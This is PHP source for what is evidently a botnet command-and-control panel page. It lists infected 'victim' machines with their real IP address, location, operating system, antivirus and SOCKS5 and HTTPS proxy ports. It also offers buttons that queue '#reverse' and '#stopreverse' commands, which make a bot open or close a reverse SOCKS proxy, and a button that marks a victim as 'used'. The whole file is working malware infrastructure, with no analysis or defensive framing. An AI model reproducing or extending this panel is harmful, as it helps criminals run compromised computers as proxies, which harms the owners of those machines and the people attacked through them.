<?php
include('inc/session.php');
if(!isset($_SESSION['pornopanel']))
{
	header("Location: login.php");
}

include('header.php');

if(isset($_POST['setused']))
{
	//echo 'setused';
	$sql = mysql_query("UPDATE vics SET used = '".time()."' WHERE vid = '".esc($_POST['vic'])."'");
	if(!$sql)
	{
		echo mysql_errno().' - '.mysql_error();
	}
	echo '
	<script type="text/javascript">
		$(document).ready(function() {
			location.reload();
		});     
    </script>
	';
}

if(isset($_POST['activate']))
{
	//echo 'activate';
	$sql = mysql_query("UPDATE vics SET command = '#reverse', active = 1 WHERE vid = '".esc($_POST['vic'])."'");
	if(!$sql)
	{
		echo mysql_errno().' - '.mysql_error();
	}
	
	echo '
	<script type="text/javascript">
		$(document).ready(function() {
			location.reload();
		});     
    </script>
	';
}

if(isset($_POST['deactivate']))
{
	//echo 'deactivate';
	$sql = mysql_query("UPDATE vics SET command = '#stopreverse' WHERE vid = '".esc($_POST['vic'])."'");
	if(!$sql)
	{
		echo mysql_errno().' - '.mysql_error();
	}
	
	echo '
	<script type="text/javascript">
		$(document).ready(function() {
			location.reload();
		});     
    </script>
	';
}

//var_dump($_POST);

if(!isset($_GET['site'])) 
{ 
	$site = 1; 
}
else
{
	$site = $_GET['site'];
}

$max = 25;
$start = $site * $max - $max;

if(isset($_GET['mode']) && $_GET['mode'] == 'online')
{
	$sql = mysql_query("SELECT * FROM vics WHERE lastcon >= '".(time()-$bots['ontime'])."' ORDER BY vid ASC LIMIT $start, $max");
	$sql_count = mysql_query("SELECT vid FROM vics WHERE lastcon >= '".(time()-$bots['ontime'])."'");
	$count = mysql_num_rows($sql_count);
}
else
{
	$sql = mysql_query("SELECT * FROM vics ORDER BY vid ASC LIMIT $start, $max");
	$sql_count = mysql_query("SELECT vid FROM vics");
	$count = mysql_num_rows($sql_count);
}

$sites = $count / $max;

echo '<h1 class="headline"><img src="images/overview.png" alt="overview" /></h1>';

echo '<div class="pagecounter">';
//pagecounter output
echo '<ul class="pagecount">';
if($sites > 0)
{
	for($a = 0 ; $a < $sites; $a++) 
	{ 
		$b = $a + 1; 
		
		if($site == $b) 
		{ 
			echo '<li class="active">'.$b.'</li>'; 
		} 
		else 
		{ 
			if(isset($_GET['mode']))
			{
				echo '<li><a href="?mode=online&site='.$b.'">'.$b.'</a></li>'; 
			}
			else
			{
				echo '<li><a href="?site='.$b.'">'.$b.'</a></li>'; 
			}
		} 
	}
}
else
{
	echo '<li class="active">1</li>';
}
echo '</ul>';
echo '<span>Seiten: </span></div>';

echo '
<p><a href="index.php?mode=online">Show Only Online Bots</a> | <a href="index.php">Show All Bots</a></p>
<div id="accordion">';

if(mysql_num_rows($sql) > 0)
{
	$color = 1;
	
	while($res = mysql_fetch_array($sql))
	{
		if($color == 1)
		{
			$color = 2;

		}
		else
		{
			$color = 1;
		}
		if($res['active'] == 1)
		{
			$active = 'Yes';
			$class = ' green_bg';
		}
		else
		{
			$active = 'No';
			$class = 'grey_bg';
		}
		
		if(BotStatus($res['lastcon']) == '<span class="red">Offline</span>')
		{
			$class = 'grey_bg';
			$sql_update = mysql_query("UPDATE vics SET active = 0 WHERE vid = '".$res['vid']."'");
			if(!$sql_update)
			{
				echo mysql_errno().' - '.mysql_error();
			}
		}
		
		//start ausgabe
		echo '
		<h3 class="listitem '.$class.'">
		<!--<table class="listhead"><tr>-->
		<ul class="listhead">
			<li class="bold"><img src="images/flags/'.$res['countryshort'].'.png" alt="'.$res['country'].'" /> - '.strtoupper($res['countryshort']).', '.$res['city'].'</li>
			<li class="right">'.BotStatus($res['lastcon']).'</li>';
		echo '</ul><div class="hidden"></div></h3><div>';
		
		//ausgeklappt
		echo '<div class="left">';
		echo '<strong>IP Address:</strong> '.$res['realip'].'<br />';
		echo '<strong>Socks5 Port:</strong> '.$res['socksport'].'<br />';
		echo '<strong>OS:</strong> '.$res['osversion'].'<br />';
		echo '<div class="hidden" style="margin-bottom: 10px;"></div>';
		
		if($res['active'] == 0)
		{
			if($res['command'] == '')
			{
				$state = '';
			}
			else
			{
				$state = 'disabled="disabled"';
			}
			echo '
				<form name="form_activate" method="post" action="'.$_SERVER['PHP_SELF'].'">
				<input type="hidden" name="vic" value="'.$res['vid'].'" />
				<input class="button" type="submit" '.$state.' name="activate" value="Activate Socks" />
				</form>
				';
		}
		else
		{
			if($res['command'] == '#reverse')
			{
				$var = 'Waiting for Bot...';
				$state = 'disabled="disabled"';
			}
			elseif($res['command'] == '#stopreverse')
			{
				$var = 'Disconnecting Bot...';
				$state = 'disabled="disabled"';
			}
			else
			{
				$var = 'Deactivate Socks';
				$state = '';	
			}
			echo '
			<form name="form_deactivate" method="post" action="'.$_SERVER['PHP_SELF'].'">
			<input type="hidden" name="vic" value="'.$res['vid'].'" />
			<input class="button" type="submit" '.$state.' name="deactivate"  value="'.$var.'" />
			</form>
			';
		}		
		
		echo '</div><div class="left" style="margin-left: 25px;">';
		echo '<strong>Proxy IP:</strong> '.$res['socksip'].'<br />';
		echo '<strong>HTTPS Port:</strong> '.$res['httpport'].'<br />';
		echo '<strong>Antivir:</strong> '.$res['antivir'].'<br />';
		echo '<div class="hidden" style="margin-bottom: 10px;"></div>';
		
		//bot used
		if($res['used'] == 0)
		{
			echo '
			<form name="form_setused" method="post" action="'.$_SERVER['PHP_SELF'].'">
			<input type="hidden" name="vic" value="'.$res['vid'].'" />
			<input class="button" type="submit" name="setused" value="Set Used" />
			</form>
			';
		}
		else
		{
			echo '<strong>Used @</strong> '.date('d.m.Y H:i', $res['used']).'<br />';
		}
		//bot used	
		
		
		echo '</div><div class="hidden"></div>';
		
		
		
		
			
		echo '</div>';
		//end ausgabe
	}
}
echo '</div>';



include('footer.php');
?>